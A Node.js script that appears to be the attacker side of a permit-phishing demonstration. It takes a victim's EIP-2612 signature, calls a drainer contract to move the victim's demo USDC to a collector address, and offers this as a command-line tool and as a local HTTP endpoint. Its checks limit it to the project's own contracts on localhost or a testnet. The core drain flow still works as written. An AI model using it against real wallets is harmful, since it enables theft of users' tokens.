// Attacker side of the counterfactual (rehearsal on OUR OWN contracts only).
// Given the victim's EIP-2612 permit signature, calls FreshDrainer.drainWithPermit on OUR DemoUSDC.
//
//   CLI :  node drain.mjs --network local|fuji --owner 0x.. --value 2480000000 --deadline 1893456000 --signature 0x..
//          node drain.mjs --network local|fuji --json permit.json
//   HTTP:  node drain.mjs --network local|fuji --serve     (127.0.0.1:8792, POST /drain, GET /state)
// --network is mandatory (never guessed). On Fuji the deployer key plays the attacker's relayer
// (it pays the gas; the loot goes to the keyless collector address of addresses.fuji.json) and
// every result prints a https://testnet.snowtrace.io/tx/ link.
//
// Refuses: any RPC that is not 127.0.0.1 or Fuji; any token other than addresses.usdc;
// any spender other than addresses.drainer; any owner other than addresses.victim.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import {
  ethers,
  ERC20_ABI,
  DRAINER_ABI,
  makeContext,
  attackerSigner,
  explorerTx,
  parseNetwork,
} from "./lib.mjs";

const PORT = Number(process.env.HOLDUP_DRAIN_PORT || 8792);
// HOLDUP_SITE_ORIGINS (comma-separated) adds origins for an isolated rehearsal served on other local ports.
const ALLOWED_ORIGINS = new Set(["http://localhost:8791", "http://127.0.0.1:8791",
  ...String(process.env.HOLDUP_SITE_ORIGINS || "").split(",").map((o) => o.trim()).filter((o) => /^http:\/\/(127\.0\.0\.1|localhost):\d+$/.test(o)),
]);
const ALLOWED_HOSTS = new Set([`127.0.0.1:${PORT}`, `localhost:${PORT}`]);
const lastDrains = [];

const fmt = (v) => ethers.formatUnits(v, 6);

function parseRequest(raw, addresses) {
  const need = (k) => {
    if (raw[k] === undefined || raw[k] === null || raw[k] === "") throw new Error(`Missing field: ${k}`);
    return raw[k];
  };
  const owner = need("owner");
  if (!ethers.isAddress(owner)) throw new Error("owner is not an address");
  if (owner.toLowerCase() !== addresses.victim.toLowerCase()) {
    throw new Error(`Refused: owner ${owner} is not the victim of this rehearsal (${addresses.victim}).`);
  }
  if (raw.token && raw.token.toLowerCase() !== addresses.usdc.toLowerCase()) {
    throw new Error(`Refused: token ${raw.token} is not our DemoUSDC (${addresses.usdc}).`);
  }
  const spender = raw.spender || addresses.drainer;
  if (spender.toLowerCase() !== addresses.drainer.toLowerCase()) {
    throw new Error(`Refused: spender ${spender} is not our FreshDrainer (${addresses.drainer}).`);
  }
  let value, deadline;
  try {
    value = BigInt(need("value"));
    deadline = BigInt(need("deadline"));
  } catch {
    throw new Error("value/deadline must be integers");
  }
  let sig;
  if (raw.signature) {
    if (!/^0x[0-9a-fA-F]{130}$/.test(raw.signature)) throw new Error("signature must be 65 bytes hex (0x + 130 hex chars)");
    sig = ethers.Signature.from(raw.signature);
  } else {
    sig = ethers.Signature.from({ v: Number(need("v")), r: need("r"), s: need("s") });
  }
  return { owner: ethers.getAddress(owner), value, deadline, v: sig.v, r: sig.r, s: sig.s };
}

async function balances(ctx) {
  const { provider, addresses } = ctx;
  const usdc = new ethers.Contract(addresses.usdc, ERC20_ABI, provider);
  const [victim, collector, allowance] = await Promise.all([
    usdc.balanceOf(addresses.victim),
    usdc.balanceOf(addresses.collector),
    usdc.allowance(addresses.victim, addresses.drainer),
  ]);
  return { victim, collector, allowance };
}

/** Core attack step. `ctx` = { provider, addresses, isLocal }, `signer` = the attacker's sender. */
export async function executeDrain(ctx, signer, rawReq) {
  const { addresses } = ctx;
  const r = parseRequest(rawReq, addresses);
  const drainer = new ethers.Contract(addresses.drainer, DRAINER_ABI, signer);
  const before = await balances(ctx);
  try {
    await drainer.drainWithPermit.staticCall(addresses.usdc, r.owner, r.value, r.deadline, r.v, r.r, r.s);
  } catch (e) {
    throw new Error(`Drain would revert (bad/expired/replayed signature or nothing to take): ${e.shortMessage || e.reason || e.message}`);
  }
  const tx = await drainer.drainWithPermit(addresses.usdc, r.owner, r.value, r.deadline, r.v, r.r, r.s);
  const receipt = await tx.wait();
  const after = await balances(ctx);
  const ev = receipt.logs
    .map((l) => { try { return drainer.interface.parseLog(l); } catch { return null; } })
    .find((p) => p && p.name === "DrainedERC20");
  const result = {
    txHash: tx.hash,
    explorer: explorerTx(addresses.chainId, tx.hash, ctx.kind),
    block: receipt.blockNumber,
    drained: ev ? ev.args.amount.toString() : null,
    before: { victim: before.victim.toString(), collector: before.collector.toString() },
    after: { victim: after.victim.toString(), collector: after.collector.toString() },
    at: new Date().toISOString(),
  };
  lastDrains.unshift(result);
  lastDrains.length = Math.min(lastDrains.length, 20);
  return result;
}

export function printResult(res) {
  console.log(`tx        ${res.txHash}`);
  console.log(`explorer  ${res.explorer}`);
  console.log(`victim    ${fmt(res.before.victim)} -> ${fmt(res.after.victim)} DUSDC`);
  console.log(`collector ${fmt(res.before.collector)} -> ${fmt(res.after.collector)} DUSDC`);
}

async function stateOf(ctx) {
  const { provider, addresses } = ctx;
  const usdc = new ethers.Contract(addresses.usdc, ERC20_ABI, provider);
  const b = await balances(ctx);
  const [name, nonce] = await Promise.all([usdc.name(), usdc.nonces(addresses.victim)]);
  const drainer = new ethers.Contract(addresses.drainer, DRAINER_ABI, provider);
  let events = [];
  try {
    const logs = await drainer.queryFilter(drainer.filters.DrainedERC20(), Math.max(0, (addresses.blockNumber || 0) - 1));
    events = logs.slice(-20).map((l) => ({
      block: l.blockNumber,
      txHash: l.transactionHash,
      victim: l.args.victim,
      token: l.args.token,
      amount: l.args.amount.toString(),
    }));
  } catch { /* log query is best-effort */ }
  return {
    chainId: addresses.chainId,
    mode: addresses.mode,
    rpcUrl: addresses.rpcUrl,
    usdc: addresses.usdc,
    drainer: addresses.drainer,
    collector: addresses.collector,
    victim: addresses.victim,
    balances: { victim: b.victim.toString(), collector: b.collector.toString(), allowanceToDrainer: b.allowance.toString() },
    permit: {
      domain: { name, version: "1", chainId: addresses.chainId, verifyingContract: addresses.usdc },
      spender: addresses.drainer,
      nonce: nonce.toString(),
    },
    events,
    lastDrains,
  };
}

function serve(ctx, signer) {
  const send = (res, code, body, origin) => {
    const h = { "content-type": "application/json" };
    if (origin && ALLOWED_ORIGINS.has(origin)) {
      h["access-control-allow-origin"] = origin;
      h["vary"] = "Origin";
    }
    res.writeHead(code, h);
    res.end(JSON.stringify(body));
  };
  const server = http.createServer(async (req, res) => {
    const origin = req.headers.origin;
    try {
      if (!ALLOWED_HOSTS.has(req.headers.host || "")) return send(res, 403, { error: "bad Host" });
      if (origin && !ALLOWED_ORIGINS.has(origin)) return send(res, 403, { error: "origin not allowed" });
      if (req.method === "OPTIONS") {
        res.writeHead(204, {
          "access-control-allow-origin": origin || "",
          "access-control-allow-methods": "GET, POST, OPTIONS",
          "access-control-allow-headers": "content-type",
          "access-control-max-age": "600",
          vary: "Origin",
        });
        return res.end();
      }
      if (req.method === "GET" && req.url === "/state") return send(res, 200, await stateOf(ctx), origin);
      if (req.method === "POST" && req.url === "/drain") {
        let body = "";
        for await (const chunk of req) {
          body += chunk;
          if (body.length > 10_000) return send(res, 413, { error: "body too large" }, origin);
        }
        let raw;
        try { raw = JSON.parse(body); } catch { return send(res, 400, { error: "invalid JSON" }, origin); }
        try {
          return send(res, 200, await executeDrain(ctx, signer, raw), origin);
        } catch (e) {
          return send(res, 400, { error: e.message }, origin);
        }
      }
      return send(res, 404, { error: "not found" }, origin);
    } catch (e) {
      return send(res, 500, { error: e.message }, origin);
    }
  });
  server.listen(PORT, "127.0.0.1", () => {
    console.log(`drain server on http://127.0.0.1:${PORT}  (POST /drain, GET /state)  chain ${ctx.addresses.chainId} ${ctx.addresses.mode}`);
  });
  return server;
}

function parseArgs(argv) {
  const o = {};
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--serve") o[a.slice(2)] = true;
    else if (a.startsWith("--")) o[a.slice(2)] = argv[++i];
  }
  return o;
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const kind = parseNetwork(process.argv.slice(2));
  delete args.network;
  const ctx = await makeContext(kind);
  const signer = await attackerSigner(ctx);
  if (args.serve) return serve(ctx, signer);
  const raw = args.json ? JSON.parse(fs.readFileSync(args.json, "utf8")) : args;
  const res = await executeDrain(ctx, signer, raw);
  printResult(res);
  process.exit(0);
}

if (process.argv[1] && import.meta.url === pathToFileURL(path.resolve(process.argv[1])).href) {
  main().catch((e) => {
    console.error("Error:", e.message || e);
    process.exit(1);
  });
}
